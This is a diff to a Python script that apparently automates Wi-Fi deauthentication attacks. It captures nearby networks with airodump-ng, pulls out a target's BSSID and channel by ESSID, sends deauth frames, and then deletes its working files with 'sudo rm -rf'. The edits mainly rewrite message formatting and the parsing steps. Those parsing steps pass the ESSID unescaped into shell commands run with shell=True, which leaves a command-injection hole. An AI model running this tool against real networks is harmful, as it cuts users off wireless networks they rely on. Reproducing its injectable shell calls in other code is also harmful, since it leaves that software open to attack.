@@ -56,7 +56,7 @@ def kiddDeAuth( BSSID, interface ):
 
         p.wait()
 
-        print( f"{ green }\n\nI am going to sleep for a while!\n\n" )
+        print( f"\n\n{ green }I am going to sleep for a while!\n\n" )
 
         time.sleep( 60 )
 
@@ -66,7 +66,7 @@ def kiddDeAuth( BSSID, interface ):
 
         subprocess.run( "sudo rm -rf ./wifiBssid.py ./wifiChannel.py ./wifiInterF.txt", shell = True, check = True )
 
-        print( f"{ red }\nStop sending DeAuth and files created by this script have been deleted!\n" )
+        print( f"\n{ red }Stop sending DeAuth and files created by this script have been deleted!\n" )
 
         sys.exit( 0 )
 
@@ -88,13 +88,13 @@ def air( IF, ESSID ):
 
     except:
 
-        print( f"\n\n{ red }Error in file creation!\n\n" )
+        print( f"\n\n{ red }Error : wifiInterF.txt file creation!\n\n" )
 
         sys.exit( 0 )
 
-    p = subprocess.Popen( [ "sudo", "airodump-ng", "-i", IF ], stdout = f )
+    p = subprocess.Popen( ["sudo", "airodump-ng", "-i", IF ], stdout= f )
 
-    print( f"\n\n{ green }Capture file is being created. Please wait!\n\n" )
+    print( f"\n\n{ green }Capture file is being created! Please wait!\n\n" )
 
     time.sleep( 10 )
 
@@ -104,11 +104,13 @@ def air( IF, ESSID ):
 
     print( f"\n\n{ green }Capture file has been created!\n\n" )
 
-    subprocess.run( f"""sudo grep -i "{ ESSID }" wifiInterF.txt | awk '!seen[$1]++ {{ bssid = $1; }} END {{ print "b=" bssid; }}' > wifiBssid.py""", shell = True, check = True )
+    subprocess.run( "grep -i '%s' wifiInterF.txt | head -n 1 | awk '{ print $2 }' > wifiBssid.py" % ESSID, shell = True, check = True )
 
-    subprocess.run( f"""sudo grep -i "{ ESSID }" wifiInterF.txt | awk '!seen[$1]++ {{ chnel = $6; }} END {{ print "c=" chnel; }}' > wifiChannel.py""", shell = True, check = True )
+    time.sleep( 0.2 )
 
-    time.sleep( 1 )
+    subprocess.run( "grep -i '%s' wifiInterF.txt | head -n 1 | awk '{ print $7 }' > wifiChannel.py" % ESSID, shell = True, check = True )
+
+    time.sleep( 0.2 )
 
     try:
 
@@ -116,23 +118,9 @@ def air( IF, ESSID ):
 
         cFile = open( "wifiChannel.py", "r" )
 
-        for x in bFile:
+        dic[ "bssid" ] = bFile.read().strip()
 
-            if "=" in x:
-
-                dic[ "bssid" ] = x.split( "=" )[ 1 ] if len( x.split( "=" )[ 1 ] ) > 1 else print( f"\n\n{ red }Error : May be that airodump-ng does not work!\n\n" )
-
-            else:
-
-                print( f"\n\n{ red }Variable is not in the file!\n\n" )
-
-                sys.exit( 0 )
-
-        for x in cFile:
-
-            if "=" in x:
-
-                dic[ "channel" ] = x.split( "=" )[ 1 ] if int( x.split( "=" )[ 1 ] ) else print( f"\n\n{ red }Error in assigning channel!\n\n" )
+        dic[ "channel" ] = cFile.read().strip()
 
     except:
 
@@ -169,4 +157,3 @@ def main():
 if __name__ == "__main__":
 
     main()
-
